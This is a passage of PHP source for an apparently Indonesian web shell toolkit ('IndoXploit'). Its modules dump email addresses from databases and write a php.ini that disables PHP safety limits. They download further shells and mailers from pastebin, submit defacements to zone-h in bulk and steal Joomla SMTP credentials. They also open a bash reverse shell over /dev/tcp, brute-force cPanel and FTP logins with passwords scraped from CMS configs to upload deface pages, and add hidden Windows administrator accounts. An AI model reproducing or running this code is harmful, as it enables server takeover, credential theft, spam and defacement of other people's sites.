<link href="http://fonts.googleapis.com/css?family=New+Rocker" rel="stylesheet">

<?php
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
$url = $_POST['url'];
$pf = $_POST['pf'];
$d = $_POST['d'];
if($d) {
	echo "<br><center><form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='pencet'></form";
}
		
	}
	
	
	elseif(isset($_GET['filx'])){
			echo"<font size='6' color='red'>
#MailFilter
</font><p>";
		
		echo'
		<head>
<meta http-equiv="content-type" content="text/html; charset=windows-1256" />
<style type="text/css">
.style1 {
        text-align: center;
}
</style>
</head>
<body >
 
<form method="post">
        <div class="style1">
                <textarea name="emails" cols="30" rows="10"></textarea>
                <br />
                <input type="submit" value="Goo" />
               
                </div>
</form>';

$emails = $_POST['emails'];
$ex = explode("\n",$emails);
$count = count($ex);
if(isset($emails)&&$count>=1){
echo "<center><font color = 'red'><b>$count </font>Number of emails  </b></center><br />";
}else{
echo "<center>  
No email </center>";
exit;}
 
if(isset($emails)){
   
 
for($i=0;$i<=$count;$i++){
$d = strtolower($ex[$i]);
 
if(strstr($d,"hotmail")   || strstr($d,"live") || strstr($d,"msn") || strstr($d,"outlook")){
$hotmail.=$d;
$nh = $nh + 1;
}else{
if(strstr($d,"yahoo")   || strstr($d,"ymail")){
$yahoo.=$d;
$ny = $ny + 1;
}else{
if(strstr($d,"gmail")  || strstr($d,"googlemail")   ){
$gmail.=$d;
$ng = $ng + 1;
}else{
if(strstr($d,"aol")   ){
$aol.=$d;
$na = $na + 1;
}else{
if(strstr($d,"mail.ru")   ){
$mailru .=$d;
$nr = $nr + 1;
}else{
if(strstr($d,"wanadoo")   ){
$wanadoo .=$d;
$nw = $nw + 1;
}else{
if(strstr($d,"ntlworld")   ){
$ntlworld .=$d;
$nt = $nt + 1;
}else{
if(strstr($d,"gmx")   ){
$gmx .=$d;
$ngm = $ngm + 1;
}else{
if(strstr($d,"@web.")   ){
$web .=$d;
$nw2 = $nw2 + 1;
}else{
 
$ather .=$d;
$nn=$nn + 1;
}
 
}
 
}
 
 
}
 
}
}
}
}
 
}
}

}                              
?>
<center><table style="width: 30%">
        <tr>      
<td><center>hotmail ( <?echo $nh;?> ) </center><textarea name="hotmailx" cols="30" rows="10" ><?echo $hotmail;?></textarea></td>
<td><center>gmail ( <?echo $ng;?> )</center><textarea name="gmailx" cols="30" rows="10" ><?echo $gmail;?></textarea></td>
<td><center>aol ( <?echo $na;?> )</center><textarea name="aolxx" cols="30" rows="10" ><?echo $aol;?></textarea></td>
<td><center>yahoo ( <?echo $ny;?> )</center><textarea name="yahoox" cols="30" rows="10" ><?echo $yahoo;?></textarea></td>
<td><center>mail.ru( <?echo $nr;?> )</center><textarea name="othersx" cols="30" rows="10" ><?echo $mailru;?></textarea></td></tr>
<tr>
<td><center>wanadoo( <?echo $nw;?> )</center><textarea name="othersx" cols="30" rows="10" ><?echo $wanadoo;?></textarea></td>
<td><center>ntlworld( <?echo $nt;?> )</center><textarea name="othersx" cols="30" rows="10" ><?echo $ntlworld;?></textarea></td>
<td><center>gmx( <?echo $ngm;?> )</center><textarea name="othersx" cols="30" rows="10" ><?echo $gmx;?></textarea></td>
<td><center>web( <?echo $nw2;?> )</center><textarea name="othersx" cols="30" rows="10" ><?echo $web;?></textarea></td>
<td><center>ather mails( <?echo $nn-1;?> )</center><textarea name="othersx" cols="30" rows="10" ><?echo $ather;?></textarea></td>
                                       
        </tr>
</table></center>
</body>
<?php
		
	
	}
	
	
elseif(isset($_GET['mailer'])){
?>
<br>
<font size='6' color='red'>
#Mailer
</font><p>
	<form action="?mailer" method="post">
		<td><select class="inputzbut" align="left"  name="pilihan" id="pilih">
		<option value="pini" >Php.ini</option>
		<option value="ler1" >Mailer 1</option>
		<option value="ler2" >Mailer 2</option>
		
	</select>
	
	<?php
		echo"<input  type=submit name=submites value=Create>";
if(is_writable(getcwd())){echo ("<font color=green> Dir Writable</font>");
}else{echo ("<font color=red>  Can't Create (Dir Not Writable)</font>");}
$submit = $_POST ['submites'];
if(isset($submit)) {
$pilih = $_POST['pilihan'];
if ( $pilih == 'pini'){
$pehapeini = "safe_mode = OFF
Safe_mode_gid = OFF
disable_functions = NONE
disable_classes = NONE
open_basedir = OFF
suhosin.executor.fun.blacklist = NONE";
file_put_contents("php.ini",$pehapeini);
echo "<br>php.ini created";
}
	elseif($pilih == 'ler1'){
$files = file_get_contents("http://pastebin.com/raw/bv9wDvqZ");
		file_put_contents("ler1.php",$files);
echo"<br>shell created (ler1.php)";
	}

	elseif($pilih == 'ler2'){
	$files = file_get_contents("http://pastebin.com/raw/YmXYj5f7");
		file_put_contents("ler2.php",$files);
echo"<br>shell created (ler2.php)";
}
}

}


	elseif(isset($_GET['dumpx'])){
		
			echo"<font size='6' color='red'>
#DUMPER
</font><p>";
error_reporting(0);
set_time_limit(0);
if($_GET['action'] == 'login'){
    $con = mysql_connect('localhost',$_GET['u'],$_GET['p']);
    if($con){
        echo 'yes';
        mysql_close($con);
    }else{
        echo 'no';
    }
    exit();
}elseif($_GET['action'] == 'go'){
    $f = go('localhost',$_GET['u'],$_GET['p'],$_GET['name']);
    if(isset($_GET['b'])){
        echo $f;
    }else{
        echo "<span class='red'>$f</span> Emails Founded. Check <span class='red'>".htmlspecialchars($_GET['name'])."</span> For Results.";
    }
    exit();
}

echo '<!DOCTYPE html>
<html>
<head>
    <title>Database Emails Extractor</title>
    <center>DB Extractor</center>
    <link href="http://fonts.googleapis.com/css?family=Racing+Sans+One" rel="stylesheet" type="text/css">
    <script src="http://code.jquery.com/jquery-2.0.2.min.js"></script>
    <script>
    $(document).ready(function(){
        $("#gogo").on("click",function(){
            user = $("#username").val();
            pass = $("#password").val();
            name = $("#name").val();
            if(user==""||pass==""||name==""){
              window.alert("You must fill all fields");
            }else{
                $.get("?action=login&u="+encodeURIComponent(user)+"&p="+encodeURIComponent(pass),function(data){
                    if(data=="no"){
                        window.alert("Incorrect username Or password. Try Again.");
                    }else{
                        $("#forms").fadeOut(300,function(){
                           $("#wait").fadeIn(300); 
                        });
                        $.get("?action=go&u="+encodeURIComponent(user)+"&p="+encodeURIComponent(pass)+"&name="+encodeURIComponent(name),function(data){
                            $("#wait").html(data);
                        });
                    }
                });
            }
        });
        $("#gog").on("click",function(){
            accounts = $("#accounts").val();
            name = $("#namee").val();
            if(accounts==""||name==""){
              window.alert("You must fill all fields");
            }else{
                $("#formmu").fadeOut(300,function(){
                    $("#wait").fadeIn(300); 
                });
                accounts = accounts.split("\n");
                totalb = 0;
                fail = 0;
                done = 0;
                for(i=0;i<accounts.length;i++){
                    login = accounts[i].split(" ");
                    $.get("?action=login&u="+encodeURIComponent(login[0])+"&p="+encodeURIComponent(login[1]),function(data){
                        if(data=="yes"){
                            $.get("?action=go&b=t&u="+encodeURIComponent(login[0])+"&p="+encodeURIComponent(login[1])+"&name="+encodeURIComponent(name),function(data){
                                totalb += parseInt(data);
                                done++;
                                tt = done+fail;
                                if(tt==accounts.length) donet(totalb,name);
                            });
                        }else{
                            fail++;
                        }
                    });
                }
                
            }
        });
        function donet(t,b){
            $("#wait").html("<span class=\"red\">"+t+"</span> Emails Founded. Check <span class=\"red\">"+b+"</span> For Results.");
        }
        $("#si").on("click",function(){
            $("#first").fadeOut(500,function(){
                $("#forms").fadeIn(500); 
            });
        });
        $("#mu").on("click",function(){
            $("#first").fadeOut(500,function(){
                $("#formmu").fadeIn(500); 
            });
        });
    });
    </script>
  <style>
    #page{
        margin: auto 25%;
        margin-top: 10px;
        
        
        padding: 0;
    }
    #title{
        margin: 0;
        padding: 0;
        text-align: center;
        font-size: 30px;
        
    }
    #footer{
        text-align: center;
        
    }
    #forms,#wait,#first,#formmu{
        margin: 0;
        padding: 10px 0;
        
    }
    #wait,#forms,#formmu{
        display: none;
    }
    #wait,#first{
        text-align: center;
    }
  
   
    button{
        padding: 10px;
    }
    .red{
        color: red;
    }
	</style>
</head>
<body>
    <div id="page">
        
        <div id="first">
            <button id="si">Single</button><button id="mu">Multiple</button>
        </div>
        <div id="forms">
        <table>
            <tr><td>Username</td><td> : </td><td><input type="text" id="username" /></td></tr>
            <tr><td>Password</td><td> : </td><td><input type="text" id="password" /></td></tr>
            <tr><td>Save As</td><td> : </td><td><input type="text" value="list.txt" id="name" /></td></tr>
            <tr><td></td><td></td><td><input id="gogo" type="submit" value="Extract!" /></td></tr>
        </table>
        </div>
        <div id="formmu">
        <table>
            <tr><td>Accounts</td><td> : </td><td><textarea id="accounts" rows="10" cols="30">username password</textarea></td></tr>
            <tr><td>Save As</td><td> : </td><td><input type="text" value="list.txt" id="namee" /></td></tr>
            <tr><td></td><td></td><td><input id="gog" type="submit" value="Extract!" /></td></tr>
        </table>
        </div>
        <div id="wait">
            loading...
        </div>
        
    </div>
</body>
</html>';
function go($host,$user,$pass,$file){
    /*
    author : G-B
    email : g22b@hotmail.com
    */
    $con = mysql_connect($host,$user,$pass);
    $fp = fopen($file,'a');
    $count = 0;
    $databases = getdata("SHOW DATABASES");
    foreach($databases as $database){
        $tables = getdata("SHOW TABLES FROM $database");
        foreach($tables as $table){
            $columns = getdata("SHOW COLUMNS FROM $database.$table");
            foreach($columns as $column){
                $emails = getdata("SELECT $column FROM  $database.$table WHERE $column REGEXP '[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]'");
                foreach($emails as $email){
                    if(filter_var($email, FILTER_VALIDATE_EMAIL)){
                        if(eregi($email,file_get_contents($file))) continue;
                        $count++;
                        fwrite($fp,"$email\n");
                    }else{
                        foreach(preg_split("/\s/",$text) as $string){
                            if(filter_var($string,FILTER_VALIDATE_EMAIL)){
                                if(eregi($string,file_get_contents($file))) continue;
                                $count++;
                                fwrite($fp,"$string\n");
                            }
                        }
                    }
                }
            }
        }
    }
    fclose($fp);
    mysql_close($con);
    return $count;
}
function getdata($sql){
    $q = mysql_query($sql);
    $result = array();
    while($d = mysql_fetch_array($q)){
        $result[] = $d[0];
    }
    return $result;
}

$data  = $_GET['data'];


if($data == 'data'){

$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];

echo "<form method='POST' enctype='multipart/form-data'>
 <input type='file'name='file' />
 <input type='submit' value='data' />

</form>";

move_uploaded_file($filetmp,$filename);
}
  

		
	}


elseif(isset($_GET['z0'])){
		echo"<font size='6' color='red'>
#MirrorMassPoster
</font><p>";
	echo'<form method="POST">
Hacker Name : <input type="text" name="defacer" size="32" style="border: solid 1px red">&nbsp&nbsp&nbspMirror :
<select style="border: solid 1px red" name="mirror">
<option>zone-h</option>
<option>dark-h</option>
<option>aljyyosh.org</option>
</select><br>
Domains :<br><textarea style="width: 678px; height: 302px;border: solid 1px red" name="domains"></textarea><br>
<input type="submit" value="Send" name="go">
</form>';

set_time_limit (0);
if (!function_exists ("curl_init")){die ("This Script uses cURL Library, you must install first !<br><a href='http://au2.php.net/manual/en/curl.setup.php'>http://au2.php.net/manual/en/curl.setup.php</a>");}
 
if (@$_POST['go'])
{
        foreach (explode ("\n", $_POST['domains']) as $domain)
        {
                post ($domain, $_POST['defacer'], $_POST['mirror']);
        }
        echo "<br><br><a target='_blank' href='http://zone-h.com/archive/published=0'>Zone-h</a><br>";
        echo "<a target='_blank' href='http://dark-h.org/onhold/?s=1'>Dark-h</a><br>";
        echo "<a target='_blank' href='http://aljyyosh.org/onhold.php'>Aljyyosh.org</a>";
}
 
function post ($url, $defacer, $mirror)
{
        $ch = curl_init ();
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt ($ch, CURLOPT_POST, 1);
 
        switch ($mirror)
        {
        case "zone-h";
                curl_setopt ($ch, CURLOPT_URL, "http://www.zone-h.com/notify/single");
                curl_setopt ($ch, CURLOPT_POSTFIELDS, "defacer=$defacer&domain1=$url&hackmode=1&reason=1");
                if (preg_match ("/color=\"red\">OK<\/font><\/li>/", curl_exec ($ch)))
                        echo "$url.&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span style='color: green'>OK</span><br>";
                else
                        echo "$url&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span style='color: red'>Error</span><br>";
                break;
        case "dark-h";
                curl_setopt ($ch, CURLOPT_URL, "http://dark-h.org/notify/kaydet.php");
                curl_setopt ($ch, CURLOPT_POSTFIELDS, "hacker=$defacer&site=$url&gkodumuz=123456&zgkod=123456&kod=123456");
                curl_exec ($ch);
                echo "$url<br>";
                break;
        case "aljyyosh.org";
                curl_setopt ($ch, CURLOPT_URL, "http://aljyyosh.org/single.php");
                curl_setopt ($ch, CURLOPT_COOKIE, "alj=aljyyosh");
                curl_setopt ($ch, CURLOPT_POSTFIELDS, "hacker=$defacer&site=$url&how=1&why=1&addsite=Send");
                if (preg_match ("/<font color=red> OK<\/font>/", curl_exec ($ch)))
                        echo "$url&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span style='color: green'>OK</span><br>";
                else
                        echo "$url&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span style='color: red'>Error</span><br>";
                break;
        default:
                break;
        }
        curl_close ($ch);
}

}


elseif(isset($_GET['smtp'])){
		echo"<font size='6' color='red'>
#JoomlaSMTPstealer
</font><p>";
		echo "<center><span>Only work in <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
	
	
	
}

elseif(isset($_GET['bc'])){
		echo"<font size='6' color='red'>
#BackConnect
</font><p>";
	
		echo "<center><form method='post'>
	Back Connect: <br>
	<input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'><br>
	<input type='text' placeholder='port' name='port_bc' value='6969'><br>
	<input type='submit' name='sub_bc' value='Reverse' style='width: 210px;'>
	</form>";
	if(isset($_POST['sub_bc'])) {
		$ip = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		exe("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
	}
	
}

elseif(isset($_GET['l0c'])){
		echo"<font size='6' color='red'>
#Localrootgrab
</font><p>";
	
	echo'<h1>NOTYET</H2>';
	
}
	
elseif(isset($_GET['hsp'])){
		echo"<font size='6' color='red'>
#HsPhere
</font><p>";
error_reporting(E_ALL);
ini_set("display_errors", 0);
$title = "HSpere Scanner" ;

$dir = "<table border='1' style='border-collapse: collapse'>
        <tr>
        	<td>ServerName</td>
        	<td>DocumentRoot</td>
        	<td>Vulnerable</td>
        </tr>
        ";
$chsphere = "/hsphere/local/config/httpd/sites/";
$opendir = opendir($chsphere); 
while (($file = readdir($opendir)) !== false) {
$path = $chsphere.$file;

$readfile = fopen($path,"r");
$content = fread($readfile,filesize($path));
fclose($readfile);

$DocumentRoot = explode('DocumentRoot', $content );
$DRoot = explode('ServerName', $DocumentRoot[1] );

$ServerName = explode('ServerName', $content );
$SName = explode('ServerAlias', $ServerName[1] );

$dir .= "<tr><td>".$SName[0]."</td><td>".$DRoot[0]."</td><td>unsecure</td></tr>"; //disini kamu bisa bikin link ke webshellnya. 
}
closedir($opendir);
$dir .= "</table>";

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
	<meta name="author" content="RaideRz" />
    <title><?php echo $title ?> - Billgate</title>
        <style type="text/css">
            *{ color: #444;}
        	body { background: #111;  }
            #xcrew { width:800px auto ; background: #000; min-height: 200px; border: 1px outset #454545; margin: 50px; padding: 5px; }
            #output {color: #333 ;} 
       </style>     
</head>
<body>
<div id="./BillGate">
<p style="font-size: 24px; text-align: center; color: red;"><strong>..:: <?php echo $title ?> - Indonesia UnderGround Coder ::..</strong></p><br/>
<div id="output">
<?php echo $dir ?>
</div>
</div>
</body>
</html>

<?php
	
}


elseif(isset($_GET['mag0'])){
	echo"<font size='6' color='red'>
#Magento
</font><br>Only work on Magento CMS";


echo'<br>
<table border=1>
<tr><form method="post" action="">&nbsp;<td>
<select class="inputzbut" align="left"  name="pilihan" id="pilih">
<option value="#">..:: magentool ::..</option>
<option value="curry">get Info</option>
<option value="dump">dump Mail</option>
<option value="mailer">mailer</option>

</select>
<input  type="submit" name="submites" class="inputzbut" value=">">
</td></form></tr></table>';

error_reporting(0);
set_time_limit(0);
$submit = $_POST ['submites'];
if(isset($submit)) {
	$pilih = $_POST['pilihan'];
		if ( $pilih == 'ini') {
			
		}
		

	///stealinfo
		elseif ( $pilih == 'curry') {
	$files = file_get_contents("http://pastebin.com/raw/wwEnDy4A");
		file_put_contents("curry.php",$files);
		echo "<script>alert('created'); hideAll();</script>";
		echo "<a href="."curry.php"." target=_blank><b>curry.php</b></a></center>";
		die();
		}
		
		
		///dumper
		elseif ( $pilih == 'dump') {
	$files = file_get_contents("http://pastebin.com/raw/qQaeZF01");
		file_put_contents("dump.php",$files);
		echo "<script>alert('created'); hideAll();</script>";
		echo "<a href="."dump.php"." target=_blank><b>dump.php</b></a></center>";
		die();
		}
	
		///mailer
		elseif ( $pilih == 'mailer') {
	$files = file_get_contents("http://pastebin.com/raw/Drdu0tGG");
		file_put_contents("mailer.php",$files);
		echo "<script>alert('created'); hideAll();</script>";
		echo "<a href="."mailer.php"." target=_blank><b>mailer.php</b></a></center>";
		die();
		}
		
		
	}
		
		

	
}


elseif(isset($_GET['cpfsuck'])){
	echo"<font size='6' color='red'>
#cP/FTP massdef
</font><p>";
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							//
						} else {
							echo "[+] username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
							$ftp_conn = ftp_connect(gethostbyname($_SERVER['HTTP_HOST']));
							$ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
							if((!$ftp_login) || (!$ftp_conn)) {
								echo "[+] <font color=red>Login Gagal</font><br><br>";
							} else {
								echo "[+] <font color=lime>Login Sukses</font><br>";
								$fi = htmlspecialchars($_POST['file_deface']);
								$deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
								if($deface) {
									$i++;
									echo "[+] <font color=lime>Deface Sukses</font><br>";
									if(function_exists('posix_getpwuid')) {
										$domain_cp = file_get_contents("/etc/named.conf");	
										if($domain_cp == '') {
											echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
										} else {
											preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
											foreach($domains_cp[1] as $dj) {
												$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
												$user_cp_url = $user_cp_url['name'];
												if($user_cp_url == $ucp) {
													echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
													break;
												}
											}
										}
									} else {
										echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
									}
								} else {
									echo "[-] <font color=red>Deface Gagal</font><br><br>";
								}
							}
							//echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses deface ".$i." Cpanel by <font color=lime>IndoXploit.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		Filename: <br>
		<input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
		Deface Page: <br>
		<input type='text' name='deface' placeholder='http://www.web-yang-udah-di-deface.com/filemu.php' style='width: 450px;'><br>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					$pass .= $pass1[1]."\n";
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Hajar'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
}


	
	
elseif(isset($_GET['mysqsuck'])){
	echo"<font size='6' color='red'>
#MYSQL
</font><p>";
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "/adminer.php";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "/adminer.php";
		} else {
			echo "<center><font color=red>fail</font></center>";
		}
	}
}



elseif(isset($_GET['krpd'])){ if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') { 
echo"<font size='6' color='red'>
#RPDTools
</font><br> Windows Only<p>";
?>
						
								<form action="" method="post">
								<table border="1px" bordercolor="#2d2b2b" cellpadding="5px">
									<tr>
										<td colspan="3" align="center" bgcolor="#2d2b2b"><font face="Fredericka the Great" size="2px" color="white">CREATE RDP</font></td>
									</tr>
									<tr>
										<td><font class='kecew'>Username</font></td>
										<td><font class='kecew'> : </font></td>
										<td><input type="text" class="bordergaya" name="username" required></td>
									</tr>
									<tr>
										<td><font class='kecew'>Password</font></td>
										<td><font class='kecew'> : </font></td>
										<td><input type="text" class="bordergaya" name="password" required></td>
									</tr>
									<tr>
										<td colspan="3" align="center"><input type="hidden" name="kshell" value="1"><input type="submit" name="submit" class="bordergaya" value="Create"></td>
									</tr>
								</table>
								</form>
								
								<br/>
								
								<form action="" method="post">
									<table border="1px" bordercolor="#2d2b2b" cellpadding="5px">
										<tr>
											<td colspan="3" align="center" bgcolor="#2d2b2b"><font face="Fredericka the Great" size="2px" color="white">OPTION</td>
										</tr>
										<tr>
											<td><font class='kecew'>Username</font></td>
											<td><font class='kecew'> : </font></td>
											<td><input type="text" name="rusername" placeholder="Masukan Username" class="bordergaya"></td>
										</tr>
										<tr>
											<td><font class='kecew'>Password</font></td>
											<td><font class='kecew'> : </font></td>
											<td><input type="text" name="gantipw" placeholder="Password Baru" class="bordergaya"></td>
										</tr>
										<tr>
											<td><font class='kecew'>Action</font></td>
											<td><font class='kecew'> : </font></td>
											<td>
												<select name="aksi" class="bordergaya">
														<option value="1">Tampilkan Username</option>
														<option value="2">Hapus Username</option>
														<option value="3">Ubah Password</option>
												</select>
											</td>
										</tr>
										<tr>
											<td colspan="3" align="center"><input type="hidden" name="kshell" value="2"><input type="submit" name="submit" class="bordergaya" value=">"></td>
										</tr>
									</table>
								</form>
								<br/>
						
						</center></center>
					
<?php if($_POST['submit']) { if($_POST['kshell']=="1") { $r_user = $_POST['username'];
 $r_pass = $_POST['password'];
 $cmd_cek_user = shell_exec("net user");
 if(preg_match("/$r_user/", $cmd_cek_user)){ echo $gaya_root.$r_user." sudah ada".$o;
 }else { $cmd_add_user = shell_exec("net user ".$r_user." ".$r_pass." /add");
 $cmd_add_groups1 = shell_exec("net localgroup Administrators ".$r_user." /add");
 $cmd_add_groups2 = shell_exec("net localgroup Administrator ".$r_user." /add");
 $cmd_add_groups3 = shell_exec("net localgroup Administrateur ".$r_user." /add");
 if($cmd_add_user){ echo $gaya_root."<font class='rapihbanget'>[+] Menambahkan User : ".$r_user." Password : ".$r_pass." <font color='greenyellow'>Berhasil!</font></font><br/><br/>".$o;
 }else { echo $gaya_root."<font class='rapihbanget'>[+] Menambahkan User : ".$r_user." Password : ".$r_pass." <font color='red'>Gagal!</font><br/><br/>".$o;
 } echo "<font class='rapihbanget'>[+] Sedang Memroses User.. Silahkan Tunggu Sebentar.. <br/>";
 if($cmd_add_groups1){ echo $gaya_root."<font class='rapihbanget'>--- Selamat! User ".$r_user." <font color='greenyellow'>Berhasil Di Proses!</font><br/><br/>".$o;
 }else if($cmd_add_groups2){ echo $gaya_root."<font class='rapihbanget'>--- Selamat! User ".$r_user." <font color='greenyellow'>Berhasil Di Proses!</font><br/><br/>".$o;
 }else if($cmd_add_groups3){ echo $gaya_root."<font class='rapihbanget'>--- Selamat! User ".$r_user." <font color='greenyellow'>Berhasil Di Proses!</font><br/><br/>".$o;
 }else { echo $gaya_root."<font class='rapihbanget'>--- Maaf User ".$r_user." <font color='red'>Gagal Di Proses!</font><br/><br/>".$o;
 } echo "<font class='rapihbanget'>[+] Server Info : </font><br/>";
 echo $gaya_root."<font class='rapihbanget'>--- ServerIP : ".$_SERVER["HTTP_HOST"]."</font><br/><font class='rapihbanget'>--- Username : ".$r_user."</font><br/><font class='rapihbanget'>--- Password : </font>".$r_pass.$o."</font><br/><br/>";
 echo "<font class='rapihbanget'>[+] Thank For Using It ~_^ </font><br/><br/>";
 } } else if($_POST['kshell']=="2") { echo "<style>
									.coeg{margin-left:30%;
}
									</style>";
 if($_POST['aksi']=="1"){ echo "<pre class='coeg'>".shell_exec("net user");
 } else if($_POST['aksi']=="2") { $username = $_POST['rusername'];
 $cmd_cek_user = shell_exec("net user");
 if (!empty($username)){ if(preg_match("/$username/", $cmd_cek_user)){ $cmd_add_user = shell_exec("net user ".$username." /DELETE");
 if($cmd_add_user){ echo "<font class='rapihbanget'>[+] Sedang Memroses.. Silahkan Tunggu.. </font><br /><br />";
 echo $gaya_root."<font class='rapihbanget'>[+] Selamat! Remove User </font><font color='orange'>".$username." </font><font color='greenyellow'>Berhasil!!</font><br /><br />".$o;
 }else { echo $gaya_root."<font class='rapihbanget'>[+] Yah :( Remove User </font><font color='orange'>".$username." </font><font color='red'>Gagal!!</font><br /><br />".$o;
 } }else { echo $gaya_root."<font class='rapihbanget'>Are You Kidding Me?! Username : </font><font color='orange'>" .$username. " </font><font color='red'> Itu Enggak Ada!!</font><br /><br />".$o;
 } }else { echo $gaya_root."<font class='rapihbanget'> Silahkan Masukkan Dahulu Username Yang Mau Di Hapus!! </font><br /><br />".$o;
 } } else if($_POST['aksi']=="3") { echo "<style>
										.tengahaja{margin-left:35%}
									 </style>";
 $username = $_POST['rusername'];
 $password = $_POST['gantipw'];
 $cmd_cek_user = shell_exec("net user");
 if (!empty($username)){ if(preg_match("/$username/", $cmd_cek_user)){ $cmd_add_user = shell_exec("net user ".$username."");
